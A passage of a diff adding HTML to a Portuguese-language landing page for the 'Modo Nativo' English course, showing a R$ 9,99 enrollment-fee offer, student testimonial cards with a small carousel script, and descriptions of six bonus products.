+        <div class="flex items-center gap-2 text-xs font-extrabold uppercase tracking-wider text-[#00d254]">
+          <span class="material-symbols-outlined text-lg text-[#00d254]">schedule</span>
+          <span>Ritmo sugerido</span>
+        </div>
+        <p class="mt-2 text-base sm:text-lg font-black text-white leading-snug">
+          15 min por dia
+        </p>
+      </div>
+    </div>
+
+    <!-- Ponte de transição entre o resumo e a oferta (sem card, sem borda, sem ícone) -->
+    <div id="ponte-transicao-oferta" class="mt-8 sm:mt-10 mb-2 sm:mb-4 w-full max-w-2xl mx-auto text-center">
+      <p class="text-base sm:text-xl font-bold text-zinc-100 leading-snug">
+        Falta só um passo para garantir a sua vaga.
+      </p>
+      <p class="mt-1.5 text-sm sm:text-base text-zinc-400 leading-relaxed">
+        Abrimos 100 vagas nesta turma. O curso e todos os bônus são por nossa conta: você paga apenas a taxa de inscrição simbólica de R$ 9,99, uma única vez.
+      </p>
+    </div>
+  </div>
+</section>
+
+<!-- ===== SEÇÃO R2 · DUAS OFERTAS (PREMIUM EM DESTAQUE + GRATUITA ABAIXO) ===== -->
+<section class="pt-2 sm:pt-4 pb-14 sm:pb-20 bg-[var(--bg-section-primary)] relative overflow-hidden" id="ofertas-resultado">
+<div class="mx-auto w-full max-w-5xl px-4 sm:px-6">
+
+  <!-- 1 & 2 · OFERTA PREMIUM EM DESTAQUE + LISTA PRINCIPAL + 1º BOTÃO DE CHECKOUT -->
+  <div class="relative rounded-3xl overflow-hidden bg-gradient-to-br from-[#ff6b00]/25 via-[#141417] to-[#ff6b00]/10 border-2 border-[#ff6b00] p-6 sm:p-10 lg:p-12 shadow-[0_20px_60px_rgba(255,107,0,0.2)]">
+    <!-- Fita 100 VAGAS · TAXA DE INSCRIÇÃO SIMBÓLICA -->
+    <div class="flex justify-center mb-6">
+      <span class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-[#ff6b00] text-[#080809] font-black text-xs sm:text-sm uppercase tracking-wider shadow-lg">
+        <span class="material-symbols-outlined text-base font-bold">bolt</span>
+        <span>100 VAGAS · TAXA DE INSCRIÇÃO SIMBÓLICA</span>
+      </span>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-[1.15fr_1fr] gap-8 lg:gap-10 items-center">
+      <!-- Coluna da Esquerda: Título + Imagem + Lista Principal com check laranja -->
+      <div class="flex flex-col items-start text-left">
+        <h2 class="text-2xl sm:text-3xl lg:text-4xl font-black text-white tracking-tight leading-tight">
+          Acesso completo 12 meses + <span class="text-[#ff6b00]">6 meses de bônus</span>
+        </h2>
+        <p class="mt-2.5 text-sm sm:text-base text-zinc-300 leading-relaxed">
+          Destrave todas as 161 lições do A1 ao C2, todos os recursos ilimitados e receba 6 meses de bônus gratuitamente:
+        </p>
+
+        <img alt="Curso Do Zero à Conversação e os 6 bônus" class="my-6 w-full max-w-[460px] h-auto drop-shadow-2xl mx-auto block select-none" loading="lazy" src="assets/oferta-todos-produtos-v2.webp"/>
+
+        <ul id="lista-principal-oferta" class="space-y-3 w-full text-sm sm:text-base text-zinc-200">
+          <li class="flex items-start gap-3">
+            <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+              <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </span>
+            <span><strong class="text-white">Curso Completo Do Zero à Conversação</strong> (161 lições do A1 ao C2)</span>
+          </li>
+          <li class="flex items-start gap-3">
+            <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+              <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </span>
+            <span><strong class="text-white">Certificado de curso livre</strong> em cada nível concluído</span>
+          </li>
+          <li class="flex items-start gap-3">
+            <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+              <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </span>
+            <span><strong class="text-white">Tutor Nativo sem limite</strong> para tirar dúvidas 24h por dia</span>
+          </li>
+          <li class="flex items-start gap-3">
+            <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+              <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </span>
+            <span><strong class="text-white">Todos os 6 bônus inclusos</strong></span>
+          </li>
+          <li class="flex items-start gap-3">
+            <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+              <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </span>
+            <span><strong class="text-[#ff8533]">+ 6 meses de bônus</strong> (18 meses de acesso no total)</span>
+          </li>
+        </ul>
+      </div>
+
+      <!-- Taxa de inscrição simbólica R$ 9,99 -->
+      <div class="rounded-2xl bg-[#0e0e11]/90 border border-[#2e2e36] p-6 sm:p-8 text-center flex flex-col items-center">
+        <img alt="Modo Nativo" class="h-14 sm:h-16 w-auto mx-auto block select-none" src="assets/logo-transparente.webp"/>
+        <p class="text-white font-black text-base sm:text-lg mt-2 tracking-tight">Acesso completo 12 meses + 6 meses de bônus</p>
+
+        <p class="text-zinc-400 text-xs sm:text-sm mt-5">
+          Curso de <span class="line-through">R$ 297,00</span> por R$ 0,00 · apenas a taxa de inscrição simbólica de
+        </p>
+
+        <div class="flex items-baseline justify-center gap-1 my-1 whitespace-nowrap">
+          <span class="text-3xl sm:text-4xl font-black text-white">R$</span>
+          <span id="preco-digito-principal" class="text-[88px] sm:text-[110px] leading-none font-black text-white tracking-tight">9</span>
+          <span class="text-4xl sm:text-5xl font-black text-white">,99</span>
+        </div>
+
+        <p class="text-zinc-200 text-lg sm:text-xl mt-2 font-medium">
+          Pagamento único. Sem mensalidades.
+        </p>
+
+        <a id="btn-checkout-premium" class="cta-checkout-premium w-full px-5 sm:px-8 py-4 min-h-[56px] mt-6 inline-flex items-center justify-center text-[15px] sm:text-lg font-black text-[#080809] bg-[#00d254] hover:bg-[#00b849] rounded-full shadow-[0_0_30px_rgba(0,210,84,0.4)] hover:shadow-[0_0_40px_rgba(0,210,84,0.6)] transform hover:-translate-y-0.5 transition-all text-center tracking-tight uppercase" href="#">
+          <span>GARANTIR MINHA VAGA POR R$ 9,99</span>
+        </a>
+
+        <div class="mt-6 flex flex-wrap justify-center gap-4 text-zinc-200 text-xs leading-tight">
+          <div class="flex items-center gap-1.5 text-left">
+            <span class="material-symbols-outlined text-xl text-[#00d254] shrink-0">verified</span>
+            <span>Compra<br/><b>Segura</b></span>
+          </div>
+          <div class="flex items-center gap-1.5 text-left">
+            <span class="material-symbols-outlined text-xl text-[#00d254] shrink-0">workspace_premium</span>
+            <span>Garantia de<br/><b>7 dias</b></span>
+          </div>
+          <div class="flex items-center gap-1.5 text-left">
+            <span class="material-symbols-outlined text-xl text-[#00d254] shrink-0">lock</span>
+            <span>Privacidade<br/><b>Protegida</b></span>
+          </div>
+        </div>
+
+        <p class="text-zinc-400 text-xs sm:text-sm text-center mt-4">
+          Por que existe uma taxa de inscrição? O valor do curso é por nossa conta. A taxa de inscrição simbólica ajuda a manter a equipe acadêmica, a emissão dos certificados de curso livre e esta oportunidade aberta para mais pessoas.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2.5 · DEPOIMENTOS DE ALUNOS ("É real!") -->
+  <div id="depoimentos-resultado" class="mt-12 w-full">
+    <style>
+      #depoimentos-carrossel::-webkit-scrollbar { display: none; }
+      @media (max-width: 639px) {
+        .depo-titulo-real { font-size: 44px; line-height: 1; }
+      }
+      @media (min-width: 640px) {
+        .depo-titulo-real { font-size: 3.75rem; line-height: 1; }
+      }
+      @media (max-width: 767px) {
+        #depoimentos-carrossel {
+          overflow-x: auto;
+          scroll-snap-type: x mandatory;
+          -webkit-overflow-scrolling: touch;
+          scrollbar-width: none;
+          -ms-overflow-style: none;
+        }
+        .depo-card {
+          scroll-snap-align: center;
+          min-width: 85%;
+          max-width: 85%;
+          flex-shrink: 0;
+        }
+      }
+      @media (min-width: 768px) {
+        #depoimentos-carrossel {
+          display: grid;
+          grid-template-columns: repeat(3, minmax(0, 1fr));
+          gap: 1.25rem;
+          overflow-x: visible;
+          scroll-snap-type: none;
+        }
+        .depo-card {
+          min-width: 0;
+          max-width: none;
+          flex-shrink: 1;
+        }
+      }
+    </style>
+
+    <div class="text-left mb-6 sm:mb-8">
+      <h3 class="depo-titulo-real text-white font-black text-[44px] sm:text-6xl leading-none">É real!</h3>
+      <p class="text-[#ff6b00] font-black text-2xl sm:text-4xl mt-2">E já está mudando o inglês dos nossos alunos.</p>
+    </div>
+
+    <!-- 3 Cards / Carrossel no mobile (overflow-x-auto snap-x) / Grid 3 colunas no desktop (md:grid-cols-3) -->
+    <div id="depoimentos-carrossel" class="flex overflow-x-auto snap-x snap-mandatory gap-4 pb-2 md:grid md:grid-cols-3 md:gap-5 md:overflow-visible md:pb-0" style="scrollbar-width: none; -ms-overflow-style: none;">
+      <!-- Card 1 · Natalia Souza -->
+      <div class="depo-card bg-white rounded-[28px] p-6 sm:p-8 text-center flex flex-col justify-between min-w-[85%] snap-center shadow-lg" style="border-radius: 28px;">
+        <p class="italic text-[#1a1a1f] text-base sm:text-lg leading-relaxed text-left" style="color: #1a1a1f;">
+          &ldquo;Caracaaa! Não tenho palavras para agradecer vocês! Fiquei na dúvida sobre a taxa, mas paguei e recebi o curso completo, do A1 ao C2, com todos os bônus prometidos. O conteúdo é muito bom! Obrigada de coração! 🥹&rdquo;
+        </p>
+        <div class="mt-6 pt-6 border-t border-zinc-100 flex items-center gap-3.5 text-left">
+          <div class="w-14 h-14 rounded-full bg-[#ff6b00]/15 text-[#ff6b00] font-black flex items-center justify-center text-lg shrink-0 overflow-hidden select-none" style="width: 56px; height: 56px; min-width: 56px; background-color: rgba(255, 107, 0, 0.15); color: #ff6b00;">
+            <img src="assets/depo-natalia.webp" alt="Natalia Souza" class="w-full h-full object-cover" loading="lazy" />
+          </div>
+          <div class="min-w-0">
+            <p class="text-[#1a1a1f] font-black text-base sm:text-lg leading-tight truncate" style="color: #1a1a1f;">Natalia Souza</p>
+            <p class="text-zinc-500 text-sm mt-0.5 leading-tight">Aluno(a) Modo Nativo</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Card 2 · Marta Ribeiro -->
+      <div class="depo-card bg-white rounded-[28px] p-6 sm:p-8 text-center flex flex-col justify-between min-w-[85%] snap-center shadow-lg" style="border-radius: 28px;">
+        <p class="italic text-[#1a1a1f] text-base sm:text-lg leading-relaxed text-left" style="color: #1a1a1f;">
+          &ldquo;Paguei a taxa e recebi o curso completo com os materiais. Estou adorando essa técnica de aprender inglês com repetição! Já pratiquei tanto que agora consigo reconhecer nas séries e nos filmes o que aprendi nas aulas. Estou muito feliz! 🧡🙌 Thanks!!&rdquo;
+        </p>
+        <div class="mt-6 pt-6 border-t border-zinc-100 flex items-center gap-3.5 text-left">
+          <div class="w-14 h-14 rounded-full bg-[#ff6b00]/15 text-[#ff6b00] font-black flex items-center justify-center text-lg shrink-0 overflow-hidden select-none" style="width: 56px; height: 56px; min-width: 56px; background-color: rgba(255, 107, 0, 0.15); color: #ff6b00;">
+            <img src="assets/depo-marta.webp" alt="Marta Ribeiro" class="w-full h-full object-cover" loading="lazy" />
+          </div>
+          <div class="min-w-0">
+            <p class="text-[#1a1a1f] font-black text-base sm:text-lg leading-tight truncate" style="color: #1a1a1f;">Marta Ribeiro</p>
+            <p class="text-zinc-500 text-sm mt-0.5 leading-tight">Aluno(a) Modo Nativo</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Card 3 · Leonardo Santos -->
+      <div class="depo-card bg-white rounded-[28px] p-6 sm:p-8 text-center flex flex-col justify-between min-w-[85%] snap-center shadow-lg" style="border-radius: 28px;">
+        <p class="italic text-[#1a1a1f] text-base sm:text-lg leading-relaxed text-left" style="color: #1a1a1f;">
+          &ldquo;Fiz a matrícula e recebi todo o material. Depois de 6 meses estudando, consegui meus certificados dos níveis Beginner e Elementary e coloquei no LinkedIn. Uma das empresas para as quais eu tinha me candidatado me contratou, e o curso fez diferença nessa conquista. Gratidão! 🙏&rdquo;
+        </p>
+        <div class="mt-6 pt-6 border-t border-zinc-100 flex items-center gap-3.5 text-left">
+          <div class="w-14 h-14 rounded-full bg-[#ff6b00]/15 text-[#ff6b00] font-black flex items-center justify-center text-lg shrink-0 overflow-hidden select-none" style="width: 56px; height: 56px; min-width: 56px; background-color: rgba(255, 107, 0, 0.15); color: #ff6b00;">
+            <img src="assets/depo-leonardo.webp" alt="Leonardo Santos" class="w-full h-full object-cover" loading="lazy" />
+          </div>
+          <div class="min-w-0">
+            <p class="text-[#1a1a1f] font-black text-base sm:text-lg leading-tight truncate" style="color: #1a1a1f;">Leonardo Santos</p>
+            <p class="text-zinc-500 text-sm mt-0.5 leading-tight">Aluno(a) Modo Nativo</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Bolinhas indicadoras (só no celular) -->
+    <div id="depoimentos-dots" class="flex md:hidden justify-center items-center gap-2 mt-4 select-none">
+      <button type="button" aria-label="Depoimento 1" class="depo-dot w-2.5 h-2.5 rounded-full bg-[#ff6b00] transition-all duration-300"></button>
+      <button type="button" aria-label="Depoimento 2" class="depo-dot w-2.5 h-2.5 rounded-full bg-zinc-600 transition-all duration-300"></button>
+      <button type="button" aria-label="Depoimento 3" class="depo-dot w-2.5 h-2.5 rounded-full bg-zinc-600 transition-all duration-300"></button>
+    </div>
+
+    <script>
+      (function () {
+        var carrossel = document.getElementById("depoimentos-carrossel");
+        var dots = document.querySelectorAll(".depo-dot");
+        if (!carrossel || !dots.length) return;
+
+        function atualizarDots() {
+          var cards = carrossel.querySelectorAll(".depo-card");
+          if (!cards.length) return;
+          var scrollLeft = carrossel.scrollLeft;
+          var cardStep = (cards[1] ? (cards[1].offsetLeft - cards[0].offsetLeft) : cards[0].offsetWidth) || (cards[0].offsetWidth + 16);
+          var activeIndex = Math.round(scrollLeft / cardStep);
+          if (activeIndex < 0) activeIndex = 0;
+          if (activeIndex >= dots.length) activeIndex = dots.length - 1;
+
+          dots.forEach(function (dot, i) {
+            if (i === activeIndex) {
+              dot.classList.remove("bg-zinc-600");
+              dot.classList.add("bg-[#ff6b00]");
+            } else {
+              dot.classList.remove("bg-[#ff6b00]");
+              dot.classList.add("bg-zinc-600");
+            }
+          });
+        }
+
+        carrossel.addEventListener("scroll", atualizarDots, { passive: true });
+
+        dots.forEach(function (dot, i) {
+          dot.addEventListener("click", function () {
+            var cards = carrossel.querySelectorAll(".depo-card");
+            if (cards[i]) {
+              cards[i].scrollIntoView({ behavior: "smooth", inline: "center", block: "nearest" });
+            }
+          });
+        });
+      })();
+    </script>
+  </div>
+
+  <!-- 3 · GRADE COM OS 6 BÔNUS DETALHADOS (2 por linha no desktop, 1 por linha no celular) -->
+  <div id="grade-bonus-resultado" class="mt-12 sm:mt-14">
+    <div class="text-center max-w-3xl mx-auto mb-8">
+      <span class="inline-flex items-center px-3.5 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider text-[#ff8533] bg-[#ff6b00]/10 border border-[#ff6b00]/50">
+        INCLUSOS NA SUA MATRÍCULA
+      </span>
+      <h3 class="mt-3 text-2xl sm:text-3xl font-black text-white tracking-tight">
+        Os <span class="text-[#ff6b00]">6 bônus</span> que você recebe junto com o curso
+      </h3>
+    </div>
+
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-5 sm:gap-6">
+      <!-- BÔNUS #1 - Fluency Planner -->
+      <div class="bonus-card-res rounded-2xl bg-[#141417] border border-[#2e2e36] overflow-hidden flex flex-col">
+        <div class="w-full bg-[#0e0e11] border-b border-[#242429] p-4 flex items-center justify-center">
+          <img alt="Bônus #1: Fluency Planner" class="w-full max-h-[210px] object-contain mx-auto block select-none" loading="lazy" src="assets/bonus-fluency-planner.png"/>
+        </div>
+        <div class="p-5 sm:p-6 flex flex-col items-start text-left flex-1">
+          <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider text-[#ff8533] bg-[#ff6b00]/10 border border-[#ff6b00]/50">
+            BÔNUS #1
+          </span>
+          <h4 class="mt-3 text-xl sm:text-2xl font-black text-white tracking-tight leading-snug">
+            Fluency <span class="text-[#ff6b00]">Planner</span>
+          </h4>
+          <p class="mt-2 text-sm text-zinc-300 leading-relaxed">
+            O mapa completo ao lado do curso para organizar sua rotina diária e não parar no meio.
+          </p>
+          <ul class="mt-4 space-y-2.5 w-full text-sm text-zinc-200">
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Plano diário de 15 minutos</span>
+            </li>
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Metas por nível, do A1 ao C2</span>
+            </li>
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Checklist das 5 etapas</span>
+            </li>
+          </ul>
+          <div class="mt-auto pt-4 border-t border-[#242429] w-full text-sm font-bold flex flex-wrap items-center gap-1.5 sm:gap-2">
+            <s class="line-through text-[#ff6b00]">R$ 47,00</s>
+            <span class="text-zinc-500">·</span>
+            <span class="text-[#00d254]">Incluído na sua matrícula</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- BÔNUS #2 - Tutor Nativo -->
+      <div class="bonus-card-res rounded-2xl bg-[#141417] border border-[#2e2e36] overflow-hidden flex flex-col">
+        <div class="w-full bg-[#0e0e11] border-b border-[#242429] p-4 flex items-center justify-center">
+          <img alt="Bônus #2: Tutor Nativo" class="w-full max-h-[210px] object-contain mx-auto block select-none" loading="lazy" src="assets/bonus-tutor-nativo.png"/>
+        </div>
+        <div class="p-5 sm:p-6 flex flex-col items-start text-left flex-1">
+          <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider text-[#ff8533] bg-[#ff6b00]/10 border border-[#ff6b00]/50">
+            BÔNUS #2
+          </span>
+          <h4 class="mt-3 text-xl sm:text-2xl font-black text-white tracking-tight leading-snug">
+            Tutor <span class="text-[#ff6b00]">Nativo</span>
+          </h4>
+          <p class="mt-2 text-sm text-zinc-300 leading-relaxed">
+            Tutor de inglês com IA dentro da plataforma para tirar qualquer dúvida na hora em que ela aparece.
+          </p>
+          <ul class="mt-4 space-y-2.5 w-full text-sm text-zinc-200">
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Dúvidas respondidas na hora, 24h por dia</span>
+            </li>
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Explicação simples com exemplos para repetir em voz alta</span>
+            </li>
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Indica a próxima lição a treinar</span>
+            </li>
+          </ul>
+          <div class="mt-auto pt-4 border-t border-[#242429] w-full text-sm font-bold flex flex-wrap items-center gap-1.5 sm:gap-2">
+            <s class="line-through text-[#ff6b00]">R$ 97,00</s>
+            <span class="text-zinc-500">·</span>
+            <span class="text-[#00d254]">Incluído na sua matrícula</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- BÔNUS #3 - Painel de Prompts -->
+      <div class="bonus-card-res rounded-2xl bg-[#141417] border border-[#2e2e36] overflow-hidden flex flex-col">
+        <div class="w-full bg-[#0e0e11] border-b border-[#242429] p-4 flex items-center justify-center">
+          <img alt="Bônus #3: Painel de Prompts" class="w-full max-h-[210px] object-contain mx-auto block select-none" loading="lazy" src="assets/bonus-painel-prompts-v2.webp"/>
+        </div>
+        <div class="p-5 sm:p-6 flex flex-col items-start text-left flex-1">
+          <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider text-[#ff8533] bg-[#ff6b00]/10 border border-[#ff6b00]/50">
+            BÔNUS #3
+          </span>
+          <h4 class="mt-3 text-xl sm:text-2xl font-black text-white tracking-tight leading-snug">
+            Painel de <span class="text-[#ff6b00]">Prompts</span>
+          </h4>
+          <p class="mt-2 text-sm text-zinc-300 leading-relaxed">
+            Prompts prontos para transformar o chat que você já usa em um parceiro diário de conversação.
+          </p>
+          <ul class="mt-4 space-y-2.5 w-full text-sm text-zinc-200">
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Prompts por situação: entrevista, viagem, reunião, restaurante</span>
+            </li>
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Modo jogo com pontos, níveis e ofensiva diária</span>
+            </li>
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Funciona no ChatGPT, Claude ou Gemini</span>
+            </li>
+          </ul>
+          <div class="mt-auto pt-4 border-t border-[#242429] w-full text-sm font-bold flex flex-wrap items-center gap-1.5 sm:gap-2">
+            <s class="line-through text-[#ff6b00]">R$ 47,00</s>
+            <span class="text-zinc-500">·</span>
+            <span class="text-[#00d254]">Incluído na sua matrícula</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- BÔNUS #4 - CV Bilíngue -->
+      <div class="bonus-card-res rounded-2xl bg-[#141417] border border-[#2e2e36] overflow-hidden flex flex-col">
+        <div class="w-full bg-[#0e0e11] border-b border-[#242429] p-4 flex items-center justify-center">
+          <img alt="Bônus #4: CV Bilíngue" class="w-full max-h-[210px] object-contain mx-auto block select-none" loading="lazy" src="assets/bonus-cv-bilingue-v2.webp"/>
+        </div>
+        <div class="p-5 sm:p-6 flex flex-col items-start text-left flex-1">
+          <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider text-[#ff8533] bg-[#ff6b00]/10 border border-[#ff6b00]/50">
+            BÔNUS #4
+          </span>
+          <h4 class="mt-3 text-xl sm:text-2xl font-black text-white tracking-tight leading-snug">
+            CV <span class="text-[#ff6b00]">Bilíngue</span>
+          </h4>
+          <p class="mt-2 text-sm text-zinc-300 leading-relaxed">
+            Preencha seus dados uma vez e gere seu currículo em português e em inglês no padrão do mercado.
+          </p>
+          <ul class="mt-4 space-y-2.5 w-full text-sm text-zinc-200">
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Currículo em português e em inglês</span>
+            </li>
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>PDF pronto para imprimir ou enviar</span>
+            </li>
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Envio direto para o LinkedIn</span>
+            </li>
+          </ul>
+          <div class="mt-auto pt-4 border-t border-[#242429] w-full text-sm font-bold flex flex-wrap items-center gap-1.5 sm:gap-2">
+            <s class="line-through text-[#ff6b00]">R$ 47,00</s>
+            <span class="text-zinc-500">·</span>
+            <span class="text-[#00d254]">Incluído na sua matrícula</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- BÔNUS #5 - Modo Guiado -->
+      <div class="bonus-card-res rounded-2xl bg-[#141417] border border-[#2e2e36] overflow-hidden flex flex-col">
+        <div class="w-full bg-[#0e0e11] border-b border-[#242429] p-4 flex items-center justify-center">
+          <img alt="Bônus #5: Modo Guiado" class="w-full max-h-[210px] object-contain mx-auto block select-none" loading="lazy" src="assets/bonus-modo-guiado-v2.webp"/>
+        </div>
+        <div class="p-5 sm:p-6 flex flex-col items-start text-left flex-1">
+          <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider text-[#ff8533] bg-[#ff6b00]/10 border border-[#ff6b00]/50">
+            BÔNUS #5
+          </span>
+          <h4 class="mt-3 text-xl sm:text-2xl font-black text-white tracking-tight leading-snug">
+            Modo <span class="text-[#ff6b00]">Guiado</span>
+          </h4>
+          <p class="mt-2 text-sm text-zinc-300 leading-relaxed">
+            Ajuda passo a passo para quem está começando do zero: dá dica e adapta o exercício até sua boca destravar.
+          </p>
+          <ul class="mt-4 space-y-2.5 w-full text-sm text-zinc-200">
+            <li class="flex items-start gap-2.5">
+              <span class="mt-0.5 w-5 h-5 rounded-full bg-[#ff6b00]/20 border border-[#ff6b00]/50 text-[#ff6b00] flex items-center justify-center shrink-0">
+                <svg aria-hidden="true" class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              </span>
+              <span>Um botão: liga e desliga quando quiser</span>
+            </li>
+            <li class="flex items-start gap-2.5">
